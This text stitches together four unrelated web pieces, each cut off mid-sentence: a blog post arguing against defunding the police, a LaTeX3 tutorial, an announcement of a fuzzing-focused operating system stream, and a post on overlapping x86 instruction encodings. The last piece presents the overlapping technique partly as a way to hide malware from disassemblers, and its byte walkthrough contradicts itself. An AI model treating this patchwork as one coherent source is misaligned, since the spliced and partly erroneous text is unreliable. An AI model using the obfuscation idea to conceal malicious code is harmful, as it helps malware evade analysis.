I hope that you’ve been enjoying reading, I have been having a lot of fun writing. I’m also really excited to say that we are at over 5,000 paid members already, which is incredible — I’m so grateful to everyone who’s decided to support the site. Paid members have been able to enjoy the comment sections and open threads so far, which have been great. Starting next week, they’ll also have exclusive access to most of the content, though I will also do a free article or two per week to stay in the mix.</p><p>Please consider subscribing or buying a gift membership if you know someone who might like it.</p><p>Today I wanted to talk about defunding the police, a topic on which I have an opinion that is both banal and controversial — it’s a bad idea. </p><p><a href="https://www.cbsnews.com/news/obama-defund-the-police-slogan/">Barack Obama recently rekindled interest</a> in the topic by telling Peter Hamby that he thinks defund activists were making a strategic or tactical error: “You lost a big audience the minute you say it, which makes it a lot less likely that you’re actually going to get the changes you want done. The key is deciding, do you want to actually get something done, or do you want to feel good among the people you already agree with?”</p><p>That’s what I would say about the post-2016 tendency of young people who support a larger welfare state to characterize their politics as “socialism” — a politically counterproductive fad that undermines a perfectly reasonable idea. But it’s not what I would say about “defund the police.” That’s a bad idea, not a bad slogan. </p><h4>“Defund the police” was pretty successful</h4><p>The whole meme that this was somehow a bad or ineffective slogan seems to me to not take the defund project seriously enough. The point of defund the police, after all, was not to help Democrats win elections — it was to defund the police. </p><p>In the immediate wake of George Floyd’s death, there was a widespread but largely non-specific desire to do something about police abuses in particular and anti-Black racism in general. That conversation could have gone in a lot of different directions. But defund activists successfully kept policing near the center of the anti-racism conversation, and kept the idea of cutting police funding absolutely at the center of the police reform conversation. In the early days, a rival activist campaign called <a href="https://www.vox.com/2020/6/5/21280402/8-cant-wait-explained-policing-reforms">8 Can’t Wait</a> that focused on operational changes to police procedures got a lot of attention. But defund successfully crowded them out, and owned the brand that if you were really hard-core about antiracism, you’d be for defunding. </p><p>A whole <a href="https://www.vox.com/2020/6/25/21303005/police-reform-bill-house-democrats-senate-republicans">bill full of police reforms passed the US House of Representatives</a> and received only a tiny fraction of the attention that was paid to defunding. </p><p>Thanks in part to the hard work of defund police activists, no Republicans who opposed that measure faced any heat over it. Instead, heat was applied to mayors and city council members in progressive cities, and the aim of the heat was to get them to enact cuts in police funding. In some cities this policy <a href="https://www.blackenterprise.com/more-than-a-dozen-cities-are-defunding-their-police-departments/">was adopted</a> and in others <a href="https://www.bloomberg.com/graphics/2020-city-budget-police-defunding/">it wasn’t</a>. But in terms of what activists can achieve, it went pretty well. They dominated the conversation. They put their idea on the agenda. And they won some successes. </p><p>The problem with all of this isn’t that the strategy didn’t work, it’s that the strategy is bad. </p><h4>Cutting police funding doesn’t fix what’s broken</h4><p>On Twitter the other day, I characterized defund police as reflecting an austerity mindset. Jamelle Bouie offered an alternate explanation that once I read it expressed the contours of the argument much better. </p><p>The basic critique here is that American police departments:</p><ul><li><p>Dish out too much violence with too little accountability.</p></li><li><p>Are not effective enough at solving serious crimes. </p></li></ul><p>This seems mostly correct to me, and it’s why you won’t see me flying any Blue Lives Matter flags — there are serious flaws with American policies. </p><p>But cutting your city’s police budget is not going to make the police more effective at catching murderers. And it’s also not going to make officers more accountable for wrongdoing. To make officers more accountable for wrongdoing, you need to adopt some kind of measures that make them more accountable. Defund activists don’t oppose increased accountability, of course. But both the 8 Can’t Wait agenda and the George Floyd Justice in Policing Act that the House passed focused on accountability. Defunders shifted the conversation off that toward defunding. But a non-accountable police department with 10 percent less money is still a non-accountable police department. </p><p>Marc The Intern<strong> </strong>put together this chart that compares how many police officers per capita a city has to how many people per capita are killed by the police department (violence data is 2013-2019 courtesy of <a href="https://mappingpoliceviolence.org/">Mapping Police Violence</a>; officer data is from the FBI in 2018). You can see there’s no relationship between the size of a department and how much deadly violence it doles out. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa84fb676-1865-4c44-bc37-8641cff62cf0_1226x891.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa84fb676-1865-4c44-bc37-8641cff62cf0_1226x891.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a84fb676-1865-4c44-bc37-8641cff62cf0_1226x891.png&quot;,&quot;height&quot;:891,&quot;width&quot;:1226,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:77085,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>Now of course what we really want to know is how many <em>unjustified</em> killings are happening. But unfortunately there’s no widely accepted index of that. </p><p>What you see here is that the biggest department relative to the size of its population by far is in Washington, DC (which I assume involves officers doing some capital-specific work of some kind) and it’s a middling department in terms of police killings. The St. Louis Police Department (the dot at the top) is dishing out a ton more deadly violence than any other city, without St. Louis being a particularly heavily policed city. </p><p>So again, far from being a failure as a slogan, “defund police” has been a very successful slogan — it’s gotten us all focused on police department budgets as a key lever to reducing misconduct, even though it doesn’t particularly seem related to the issue at hand. </p><h4>More cops, less violent crime </h4><p>Bouie mentioned the low clearance rate for violent crimes in America, which is something that’s come up in a lot of discussions over the past few months. </p><p>I think there are a few things to say about this. One is that changes matter at the margin. The police in DC closed 66 percent of murders in 2018 which was less than the 71 percent they closed in 2017. If that number just kept heading down from 66 percent to 61 percent to 56 percent to 51 percent, that would be change for the worse. And it seems to me that there’s pretty good reason to believe that if you cut funding for homicide investigations, you’d solve fewer murders. Of course, you could make a small cut in a police department's budget while insulating homicide investigations. But the more dramatic the cuts you ask for, the harder it is to insulate useful investigations. And to the extent that we want the police to solve a larger share of violent crimes, it looks like they need more resources, not fewer. </p><p><a href="https://www.eurekalert.org/pub_releases/2019-08/du-spe072519.php">Cook et. al.</a> did a study of shooting investigations in Boston and they found that homicides attract significantly more investigative resources in terms of person-hours spent on the case than non-fatal shootings. They also found that homicides are significantly more likely to be solved than non-fatal shootings, basically in direct proportion to the person-hours spent on investigating them. So if we are frustrated by police departments’ limited success at solving crimes, one natural solution would be to give them more money to hire more detectives. </p><p>Of course most police officers are not detectives; they’re uniform cops doing patrol work. And the evidence across a large range of studies is that <a href="https://www.vox.com/2020/6/18/21293784/alex-vitale-end-of-policing-review">having more officers on patrol leads to less crime</a>, including violent crime. Not because the beat cops solve crime, but because their presence deters it. </p><p>There is a lot of different research on this, but one paper that is directly relevant to our current political situation is Steven Mello’s <a href="https://www.princeton.edu/~smello/papers/cops.pdf">look</a> at police funding in Barack Obama’s 2009 stimulus bill:</p><blockquote><p>I exploit a natural experiment to estimate the causal effect of police on crime. The American Recovery and Reinvestment Act increased funding for the Community Oriented Policing Services (COPS) hiring grant program from less than&nbsp;$20 million over 2005-2008 to&nbsp;$1 billion in 2009. Hiring grants distributed in 2009 were allocated according to an application score cutoff rule, and I leverage quasi-random variation in grant receipt by comparing the change over time in police and crimes for cities above and below the threshold in a difference in differences framework. Relative to low-scoring cities, those above the cutoff experience increases in police of about 3.2% and declines in victimization cost-weighted crime of about 3.5% following the distribution of hiring grants. The effects are driven by large and statistically significant effects of police on robbery, larceny, and auto theft, with suggestive evidence that police reduce murders as well. Crime reductions associated with additional police were more pronounced in areas most affected by the Great Recession. The results highlight that fiscal support to local governments for crime prevention may offer large returns, especially during bad macroeconomic times.</p></blockquote><p>A big part of what’s been happening in American politics recently is that Democrats in Congress have been fighting for federal aid to state and local governments and Republicans have been opposing this. I think we have very solid evidence that the last federal “fund the police” push was a big success in policy terms, and it’s an idea Democrats should have more explicitly championed in this debate.</p><h4>Better policing will cost more money </h4><p>Beat cops are effective at reducing crime, and investing money in hiring them is worthwhile. Investigative cops also appear to be at least somewhat effective at solving violent crimes, and investing money in hiring more more of them would lead to higher clearance rates. </p><p>But that would still leave us with the core concern that too many police officers are able to get away with misconduct with impunity. </p><p>To solve this, we need to change the rules and …</p></div></div>

  <p>Many people view LaTeX as a typesetting language and overlook the importance of programming in
document generation process. As a matter of fact, many large and structural documents can benefit
from a programming backend, which enhances layout standardization, symbol coherence, editing speed
and many other aspects. Despite the fact the standard LaTeX (LaTeX2e) is already Turing complete, which
means it is capable of solving any programming task, the design of many programming interfaces is highly
inconsistent due to compatibility considerations. This makes programming with LaTeX2e very challenging and
tedious, even for seasoned computer programmers.</p>

<p>To make programming in LaTeX easier, the LaTeX3 interface is introduced, which aims to provide
modern-programming-language-like syntax and library for LaTeX programmers. Unfortunately, there is
little material regarding this wonderful language. When I started learning it, I had to go through
its complex technical manual, which is time-consuming. Therefore, I decide to write a LaTeX3 tutorial
that is easy-to-understand for generic programmers.</p>

<h2 id="why-latex3">Why LaTeX3?</h2>

<h3 id="handle-macro-expansion-like-a-boss">Handle macro expansion like a boss</h3>

<p>Fundamentally, <img src="https://www.alanshawn.com/media/2020/latex3/tex.svg" alt="TeX"> works by doing macro substitution: commands are substituted by their definition, which is subsequently replaced by definition’s definition, until something irreplaceable is reached (e.g. text). For example, in the following example, <code><span>\myname</span></code> is substituted by <code><span>\mynameb</span></code>; <code><span>\mynameb</span></code> is then substituted by <code><span>\mynama</span></code>; and eventually, <code><span>\mynamea</span></code> is replaced by <code>John Doe</code>, which cannot be expanded anymore. This process is called <strong>expansion</strong>.</p>

<div><div><pre><code><span>\newcommand</span><span>{</span><span>\mynamea</span><span>}{</span>John Doe<span>}</span>
<span>\newcommand</span><span>{</span><span>\mynameb</span><span>}{</span><span>\mynamea</span><span>}</span>
<span>\newcommand</span><span>{</span><span>\myname</span><span>}{</span><span>\mynameb</span><span>}</span>
My name is <span>\myname</span>.
</code></pre></div></div>

<p>Most <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX"> command we use everyday has complicated definitions. During compilation, they will be expanded recursively until text or <a href="https://tex.stackexchange.com/questions/267980/what-is-a-primitive-a-macro-and-how-do-they-compare"><img src="https://www.alanshawn.com/media/2020/latex3/tex.svg" alt="TeX"> primitive</a> is reached. This process sounds pretty straightforward, until we want to <em>change the order of macro expansion</em>.</p>

<p>Why do we need to change the order of macro expansion? Let’s consider the <code><span>\uppercase</span></code> macro in <img src="https://www.alanshawn.com/media/2020/latex3/latexe.svg" alt="LaTeX2e">, which turns lowercase letters into uppercase ones. But consider the following case, where we try to apply <code><span>\uppercase</span></code> to letters <code>abcd</code> and a command <code><span>\cmda</span></code>. Since <code><span>\cmda</span></code> expands to <code>abcd</code>, we expect the outcome to be <code>ABCDABCD</code>. In reality, <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX"> gives us <code>ABCDabcd</code>, which means the content of <code><span>\cmda</span></code> is <em>unchanged</em>.</p>

<div><div><pre><code><span>\newcommand</span><span>{</span><span>\cmda</span><span>}{</span>abcd<span>}</span>
<span>\uppercase</span><span>{</span>abcd<span>\cmda</span><span>}</span> <span>%ABCDabcd</span>
</code></pre></div></div>

<p>How can this happen? During the expansion of <code><span>\uppercase</span></code>, the command scans the item inside the adjacent curly braces one by one. If an English letter is encountered, an uppercase counterpart is left in the output stream; otherwise, the original item is left in the input stream. When it’s <code><span>\cmda</span></code>’s turn, because it is a command instead of a letter, it is left <em>untouched</em> in the output stream, which is expanded to <code>abcd</code> later.</p>

<p>What if we want to capitalize <em>everything</em> inside the curly braces? That would require the macro <code><span>\cmda</span></code> to be expanded before <code><span>\uppercase</span></code>, or equivalently, changing the order of macro expansion. The classical way of doing so in <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX"> is via <code><span>\expandafter</span></code>. Unfortunately, the usage of <code><span>\expandafter</span></code> is extremely complicated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>: in a string of <code>n</code> tokens<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>, to expand the <code>i</code>th token, there must be \(2^{n-i}-1\) <code><span>\expandafter</span></code>’s before the <code>i</code>th token. Below is a <a href="https://tex.stackexchange.com/questions/104506/expanding-arguments-before-macro-call">example</a> of how bad this can look like:</p>

<div><div><pre><code><span>\documentclass</span><span>{</span>article<span>}</span>
<span>\begin{document}</span>

<span>\def\x</span>#1#2#3#4<span>{</span><span>%</span>
  <span>\def\arga</span><span>{</span>#2<span>}</span><span>%</span>
  <span>\def\argb</span><span>{</span>#3<span>}</span><span>%</span>
  <span>\def\argc</span><span>{</span>#4<span>}</span><span>%</span>
  <span>\expandafter\expandafter\expandafter\expandafter\expandafter\expandafter\expandafter</span>#1<span>%</span>
    <span>\expandafter\expandafter\expandafter\expandafter\expandafter\expandafter\expandafter</span>
      <span>{</span><span>\expandafter\expandafter\expandafter\arga\expandafter\expandafter\expandafter</span><span>}</span><span>%</span>

<span>\end{document}</span>
</code></pre></div></div>

<p>Clearly, it is nowhere near decency: the excessive number of <code><span>\expandafter</span></code>’s are sometimes referred to as “<code><span>\expandafter</span></code> purgatory”. As a result, one of the features of <img src="https://www.alanshawn.com/media/2020/latex3/latex3.svg" alt="LaTeX3"> is to provide simple and reliable expansion control.</p>

<p>These inconsistencies set a high bar for new <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX"> users and make it difficult to connect multiple components together, even for experienced <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX"> programmers. Therefore, <img src="https://www.alanshawn.com/media/2020/latex3/latex3.svg" alt="LaTeX3"> aims to provide standardized programming interfaces and documentation for the language.</p>

<h3 id="goals-of-latex3">Goals of LaTeX3</h3>



<h2 id="latex3-naming-conventions-i-1">LaTeX3 Naming Conventions (I-1)</h2>

<p>In the following code snippet, we declare a variable <code><span>\vara</span></code> and a function <code><span>\cmda</span></code>. The way we distinguish between a <em>variable</em> and a <em>function</em> is simply by judging whether the command absorbs arguments or not. However, the fact that they are all called “commands” and created with <code><span>\newcommand</span></code> reflects that they are fundamentally the same for <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX"> system.</p>

<div><div><pre><code><span>\newcommand</span><span>{</span><span>\vara</span><span>}{</span>this is a variable<span>}</span>
<span>\newcommand</span><span>{</span><span>\cmda</span><span>}</span>[1]<span>{</span>this is a command: #1<span>}</span>
</code></pre></div></div>

<p>From users’ perspective, it is important to separate variables from functions because their usages are different. Therefore, our only option is to encode this information into the name of commands, so that users can differentiate variables and functions with little effort. This is why we need to introduce the <img src="https://www.alanshawn.com/media/2020/latex3/latex3.svg" alt="LaTeX3"> naming convention. Before actually elaborating on <img src="https://www.alanshawn.com/media/2020/latex3/latex3.svg" alt="LaTeX3"> naming style, I would like to make a small diversion and introduce <em>category code</em> first.</p>

<h3 id="category-code-and-command-names">Category code and command names</h3>

<p>In <img src="https://www.alanshawn.com/media/2020/latex3/latex.svg" alt="LaTeX">, every character that we enter is associated with a category code.

  <div itemprop="articleBody">
    <h2 id="summary">Summary</h2>

<p>We’re going to work on an <em>operating system</em> which is designed specifically for fuzzing! This is going to be a streaming series for most of December which will cover making a new operating system with a strong focus on fuzzing. This means that things like the memory manager, determinism, and scalability will be the most important parts of the OS, and a lot of effort will go into making them super fast!</p>

<h2 id="when">When</h2>

<p>Streaming will start sometime on Thursday, December 10th, probably around 18:00 UTC, but the streams will be at relatively random times on relatively random days. I can’t really commit to specific times!</p>

<p>Streams will likely be 4-5 days a week (probably M-F), and probably 8-12 hours in length. We’ll see, who knows, depends how much fun we have!</p>

<h2 id="where">Where</h2>

<p>You’ll be able to find the streams live on my <a href="https://twitch.tv/gamozo">Twitch Channel</a>, and if you’re unlucky and miss the streams, you’ll be able to find the recordings on my <a href="https://www.youtube.com/user/gamozolabs">YouTube Channel</a>! Don’t forget to like, comment, and subscribe, of course.</p>

<h2 id="what">What</h2>

<p>So… ultimately, I don’t really know what all will happen. But, I can predict a handful of things that we’ll do. First of all, it’s important to note that these streams are not training material. There is no prepared script, materials, flow, etc. If we end up building something totally different, that’s fine and we’re just going with the flow. There is no requirement of completing this project, or committing to certain ways the project will be done. So… with that aside.</p>

<p>We’ll be working on making an operating system, specifically for x86-64 (Intel flavor processors at the start, but AMD should work in non-hypervisor mode). This operating system will be designed for fuzzing, which means we’ll want to focus on making virtual memory management extremely fast. This is the backbone of most performant fuzzing, and we’ll need to be able to map in, unmap, and restore pages as they are modified by a fuzz case.</p>

<p>To keep you on the edge of your toes, I’ll first start with the boring things that we have to do.</p>

<h3 id="os">OS</h3>

<p>We have to make an operating system which boots. We’re gonna make a UEFI kernel, and we might dabble in running it on ARM64 as most of our code will be platform agnostic. But, who knows. It’ll be a pretty generic kernel, I’m mainly going to develop it on bare metal, but of course, we’ll make sure it runs on KVM/Xen/Hyper-V such that it can be used in a cloud environment.</p>

<h3 id="acpi">ACPI</h3>

<p>We’re gonna need to write ACPI table parsers such that we can find the NUMA locality of memory and CPUs on the system. This will be critical to getting a high performance memory manager that scales with cores.</p>

<h3 id="multi-processing">Multi-processing</h3>

<p>Of course, the kernel will support multiple cores, as otherwise it’s kinda useless for compute.</p>

<h3 id="10gbit-networking--tcp-stack">10gbit networking + TCP stack</h3>

<p>Since I never work with disks, I’m going to follow my standard model of just using the network as general purpose whatever. To do this, we’ll need 10gbit network drivers and a TCP stack such that we can communicate with the rest of a network. Nothing too crazy here, we’ll probably borrow some code from <a href="https://github.com/gamozolabs/chocolate_milk">Chocolate Milk</a></p>

<hr>

<h2 id="interesting-stuff">Interesting stuff</h2>

<p>Okay, that stuff was boring, lets talk about the fun parts!</p>

<h3 id="exotic-memory-model">Exotic memory model</h3>

<p>Since we’ll be “snapshotting” memory itself, we need to make sure things like pointers aren’t a problem. The fastest, easiest, and best solution to this, is simply to make sure the memory always gets loaded at the same address. This is no problem for a single core, but it’s difficult for multiple cores, as they need to have copies of the same data mapped at the same location.</p>

<p>What’s the solution? Well of course, we’ll have every single core on the system running it’s own address space. This means there is no shared memory between cores (with some very, very minor execeptions). Not only does this lead to execeptionally high memory access performance (due to caches only being in the exclusive or shared states), but it also means that shared (mutable) memory will not be a thing! This means that we’ll do all of our core synchronization through message passing, which is higher latency in the best case than shared memory models, but with an advantage of scaling much better. As long as our messages can be serialized to TCP streams, that means we can scale across the network without any effort.</p>

<p>This has some awesome properties since we no longer need any locks to our page tables to add and remove entries, nor do we need to perform any TLB shootdowns, which can cost tens thousands of cycles.</p>

<p>I used this model in <a href="https://gamozolabs.github.io/metrology/2019/08/19/sushi_roll.html">Sushi Roll</a>, and I really miss it. It had incredibly good performance properties and forced a bit more thought about sharing information between cores.</p>

<h3 id="scaling">Scaling</h3>

<p>As with most things I write, linear scaling will be required, and scaling across the network is just implied, as it’s required for really any realistic application of fuzzing.</p>

<h3 id="fast-and-differential-memory-snapshotting">Fast and differential memory snapshotting</h3>

<p>So far, none of these things are super interesting. I’ve had many OSes that do these things well, for fuzzing, for quite a long time. However, I’ve never made these memory management techniques into a true data structure, rather I use them as needed manually. I plan to make the core of this operating system, a combination of Rust procedural macros and virtual memory management tricks to allow for arbitrary data structure to be stored in a tree-shaped checkpointed structure.</p>

<p>This will allow for fast transitions between different state of the structure as they were snapshotted. This will be done by leveraging the dirty bits in the page tables, and creating an allocator that will allocate in a pool of memory which will be saved and restored on snapshots. This memory will be treated as an opaque blob internally, and thus it can hold any information you want, device state, guest memory state, register state, something completely unrelated to fuzzing, won’t matter. To handle nested structures (or more specifically, pointers in structures which are to be tracked), we’ll use a Rust procedural macro to disallow untracked pointers within tracked structures.</p>

<p>Effectively, we’re going to heavily leverage the hardware’s MMU to differentally snapshot, teleport between, and restore blobs of memory. For fuzzing, this is necessary as a way to hold guest memory state and register state. By treating this opaquely, we can focus on doing the MMU aspects really well, and stop worrying about special casing all these variables that need to be restored upon resets.</p>

<h3 id="linux-emulator">Linux emulator</h3>

<p>Okay, so all of that is kinda to make room for developing high performance fuzzers. In my case, I want this mainly for a new rewrite of vectorized emulation, but to make it interesting for others, we’re going to implement a Linux emulator capable of running QEMU.</p>

<p>This means that we’ll be able to (probably staticially only) compile QEMU. Then we can take this binary, and load it into our OS and run QEMU in our OS. This means we can control the syscall responses to the requests QEMU makes. If we do this deterministically (we will), this means QEMU will be deterministic. Which thus means, the guest inside of QEMU will also be deterministic. You see? This is a technique I’ve used in the past, and works exceptionally well. We’ll definitely outperform Linux’s handling of syscalls, and we’ll scale better, and we’ll blow Linux away when it comes to memory management.</p>

<h3 id="kvm-emulator--hypervisor">KVM emulator + hypervisor</h3>

<p>So, I have no idea how hard this would be, but from about 5 minutes of skimming the interwebs, it seems that I could pretty easily write a hypervisor in my OS that emulates KVM ioctls. Meaning QEMU would just think KVM is there, and use it!</p>

<p>This will give us full control of QEMU’s determinism, syscalls, performance, and reset speeds… without actually having to modify QEMU code.</p>

<h2 id="thats-it">That’s it</h2>

<p>So that’s the plan. An OS + fast MMU code + hypervisor + Linux emulator, to allow us to deterministically run anything QEMU can run, which is effectively everything. We’ll do this with performance likely into the millions of VM resets per second per core, scaling linearly with cores, including over the network, to allow some of the fastest general purpose fuzzing the world has ever seen :D</p>

<h2 id="faq">FAQ</h2>

<p>Some people have asked questions on the internet, and I’ll post them here:</p>

<h3 id="hackernews-q1">Hackernews Q1</h3>

<p>Q:</p>

<div><div><pre><code>Huh. So my initial response was, "why on earth would you need a whole OS for that", but memory snapshotting and improved virtual memory performance might actually be a good justification. Linux does have CRIU which might be made to work for such a purpose, but I could see a reasonable person preferring to do it from a clean slate. On the other hand, if you need qemu to run applications (which I'm really unclear about; I can't tell if the plan is to run stuff natively on this OS or just to provide enough system to run qemu and then run apps on linux on qemu) then I'm surprised that it's not easier to just make qemu do what you want (again, I'm pretty sure qemu already has its own memory snapshotting features to build on).

Of course, writing an OS can be its own reward, too:) 
</code></pre></div></div>

<p>A:</p>

<div><div><pre><code>Oooh, wasn't really expecting this to make it to HN cause it was meant to be more of an announcement than a description.

But yes, I've done about 7 or 8 operating systems for fuzzing in the past and it's a massive performance (and cleanliness) cleanup. This one is going to be like an operating system I wrote 2-3 years ago for my vectorized emulation work.

To answer your QEMU questions, the goal is to effectively build QEMU with MUSL (just to make it static so I don't need a dynamic loader), and modify MUSL to turn all syscalls to `call` instructions. This means a "syscall" is just a call to another area, which will by my Rust Linux emulator. I'll implement the bare minimum syscalls (and enum variants to those syscalls) to get QEMU to work, nothing more. The goal is not to run Linux applications, but run a QEMU+MUSL combination which may be modified lightly if it means a lower emulation burden …</code></pre></div></div></div></article></div></div></div>

  <div itemprop="articleBody">
    
<p>Computer programs comes in all shapes and sizes, but one of the most important form is x86 binary executables. These files can be read by an x86 CPU and will alter the CPU  state in some way. Much effort has gone into how we represent these binaries, like making them smaller so that they execute faster. But also much effort has gone into making them harder the read when decompiled, aka being turned back from binary into human-readable text. People do this to for instance protect intellectual property, but also to hide malicious code. It is vital for us thus to understand all forms of which is possible to get both the optimization and to defend ourselves against malicious actors.</p>

<p>One still completely undiscovered is that of binary overlapping. Where the same byte sequence can be interpreted as multiple programs if you start parsing with just one byte off. The key distinction that we do not start parsing at the start of a different instruction, but always somewhere in the middle, and keeping it that way for as long as possible.</p>

<p>When an x86 CPU executes a program, a pointer points towards a sequence of bytes.
The CPU will read these a byte at a time until the CPU recognizes the instruction and it will execute it.
After execution is done, it will continue reading bytes until it recognizes an instruction repeating this process.
The CPU’s today will not strictly adhere to this model anymore and it might execute/parse instructions in advance under the hood already, but it still has to guarantee this model works. We will also consider this model because other software like disassemblers typically works this way.</p>

<p>In x86, instructions are by definition anywhere between 1-15 bytes long, they follow a complex encoding scheme which we will ignore for now. 
Furthermore, the word “instruction” is a little bit ambiguous, since it can refer to</p>
<ol>
  <li>the mnemonic, i.e ADD</li>
  <li>the assembler form: i.e ADD rax, 2</li>
  <li>the binary encoding, i.e for ADD that might be 0x10 0x34.</li>
</ol>

<p>And a program is a simple list of instructions.</p>

<p>So let us dive into the good stuff!</p>

<p>Consider the binary following binary sequence. The lines are separated on an instruction level basis. The values in hexadecimal are displayed to the left, and the corresponding assembler form to the right.</p>

<div><div><pre><code>0f 0d c0        NOP EAX, EAX
90              NOP
90              NOP
31  ff          XOR EDI, EDI
</code></pre></div></div>

<p>If executed by the CPU, it will first read the byte <code>0f</code>, this doesn’t mean anything yet. So we will parse a second byte, <code>c0</code>. Still nothing, then we read <code>d0</code> and we get a specified instruction. In this case <code>NOP EAX, EAX</code>. Best described as “No OPeration executed with register EAX and EAX”.</p>

<p>Afterward, we read two <code>NOP</code>s and a <code>XOR</code> instruction that <code>XOR</code>s both its inputs. Hence zeroing out all content.</p>

<p>What this program does is not that interesting. After all, it does nothing for a bit and then only zero’s out an register. But after 3 years this is the most beautiful program I could think of.</p>

<p>First things first, why do we execute the same operation for the byte sequence <code>0f 0d c0</code> as for <code>90</code>. How is it possible that two byte-sequences that share not a single byte represent the same instruction?</p>

<p>If we look up <code>0f 0d c0</code> in the x86 instruction set manual, we can see that it is an instruction for prefetching hints. So it should not affect the state on the CPU (or at least observable to us). Hence the disassembler in which I generated this output decided it was equivalent to a NOP and should be displayed as such.</p>

<p>However, this above piece of code is only disassembled like that because I threw it inside a proper disassembler (intel’s XED in this case). Let’s take a look at the output of an arguably more well-known disassembler, objdump.</p>

<div><div><pre><code>0f                      prefetch (bad)
0d c0 90 90 31          or     $0x319090c0,%eax
....
</code></pre></div></div>

<p>Three interesting things happened here, first of all, it didn’t decode it correctly. Which isn’t too uncommon even in mainstream disassemblers if you start hunting for it[0]. 
The second interesting thing that happened is that we suddenly obtained a totally new instruction that we have not seen before by starting execution/parsing one byte later, while still using the same original byte sequence!</p>

<p>But most importantly of all, <em>what is the next executed instruction</em>?
We know it is should be the next byte in the stream, so looking at the first output: here we can see it should start with <em>FF</em>.</p>

<p>If we would continue this, we would have to completely independent programs inside the same original binary sequence!</p>



<p>This technique has 2 very interesting use-cases. The original use-case, and the reason why I came up with this idea, is obfuscation. 
Notice that in the second output, the output of the disassembler objdump, can now theoretically be <em>completely different</em> program from what another actor, like your CPU, could read. Implying that malware can be completely hidden from malware analysis or automatic analysis tools without <em>any</em> overhead. Only by exploiting a single parsing error. Which can be guaranteed against most common disassembler parsing techniques (this will the topic of another blog).</p>

<p>The second and probably more exciting use case is performance.
In the examples above we didn’t give that much thought on what the programs are or are supposed to look like.</p>

<p>But let us consider a program P. If we take the second half of P, and we were magically able to alter the first half of P such that its functionality would be retained, and that if you would start parsing from the second byte it would execute the second half of the original P. Then we have effectively halved our program size! And we could continue doing this until we have reduced it by a massive factor.</p>


<p>If we consider binary sequence, we say they are binary overlapping, if and only if, we can obtain a program P<sup>1</sup> and P<sup>2</sup> such that</p>
<ol>
  <li>To execute P<sup>1</sup>, we start executing at a different byte in the byte sequence than for P<sup>2</sup></li>
  <li>For each instruction in P<sup>1</sup>, no instruction ends with the same byte index in the sequence as any other in P<sup>2</sup></li>
</ol>

<p>The first property is to ensure we talk about programs that are obtained by starting at a different location than another.</p>

<p>The second property is there to stop them from converging. If this property wasn’t satisfied, any 2 different programs would converge into the same from that point onwards, example:</p>

<div><div><pre><code>ff c5                   inc    ebp
fc                      cld
77 90                   ja     0xffffffffffffff95
90                      nop             &lt;- same as the second stream
...
...
</code></pre></div></div>

<div><div><pre><code>c5 fc 77                vzeroall
90                      nop
90                      nop             &lt;- same as the first stream
...
...
</code></pre></div></div>

<h2 id="obtaining-these-binaries">Obtaining these binaries</h2>
<p>We have 3 options that I’m aware of for obtaining these binaries.
We can write these binaries by hand, this is, of course, no option besides for very specialized cases and probably not worth it.</p>

<p>The second option is by trying to alter the generation process of our compiler/assembler.
Computationally generating binaries like this is heavy and our current tooling is not designed to support generating these binaries.</p>

<h3 id="compiler-generation">Compiler Generation</h3>

<p>Let me illustrate the complexity with the following example: 
Suppose we have 2 programs P<sup>1</sup> and P<sup>2</sup>, which we want to overlap. Meaning that the first byte of P<sup>2</sup> should be the second byte of P<sup>1</sup>.
Consider that P<sup>1</sup> is a simple program that wants to first execute an <code>add</code> followed by a <code>mov</code>, while P<sup>2</sup> wants to execute an <code>xor</code> followed by a <code>jmp</code>. For brevities sake, I omitted possible arguments.</p>

<p>Our magical super awesome assembler would look at P<sup>1</sup>, recognizes that we should output a binary encoding for <code>add</code>. Now it would look up which bytes are defined to represent <code>add</code> and it would emit it to some structure. 
Let’s say for <code>add</code> the assembler emitted <code>10 AE</code>.</p>

<p>Now before we continue, we have to satisfy that P<sup>2</sup> also gets generated correctly. Unfortunately for us, the <code>xor</code> instruction is defined to be <code>06 84</code>.</p>

<p>In its current form, it seems as if <code>add</code> and <code>xor</code> are incompatible for binary overlapping.
Luckily for us, due to the incredibly complex nature, there is a large set of transformations that can help to remedy this situation.</p>

<p>For instance, it is not completely uncommon that an instruction has a different encoding. So while <code>add</code> was first defined to be <code>10 AE</code> at first, it might be the case that in the documentation an equivalent encoding exists for our use-case, so maybe we might substitute it with <code>30 06 84 20</code>. Enabling us to binary overlap at a cost of lengthening P compared to what we otherwise would.</p>

<p>So now we got <code>add</code> and <code>xor</code> to overlap. But now we run into the same problem for the second instruction for P<sup>1</sup>, our generated encoding for <code>mov</code> may now only start with <code>20</code>!</p>

<p>This means that chance of being able to satisfy the overlapping properties for instructions is <strong>incredibly</strong> small. 
Hence we need every help we can get through combining many different techniques, such that we get an acceptable rate of being able to produce our desired binaries.</p>

<h4 id="overview-of-generation-techniques">Overview of generation techniques</h4>
<p>Through the 3 years that I have been thinking about this problem, I accumulated a list of possible techniques:</p>

<ul>
  <li>use a semantically equivalent instruction, like changing <code>ADD 1</code> to <code>INC</code>remenent. Using <code>prefetchw</code> directives instead of <code>NOP</code>s.</li>
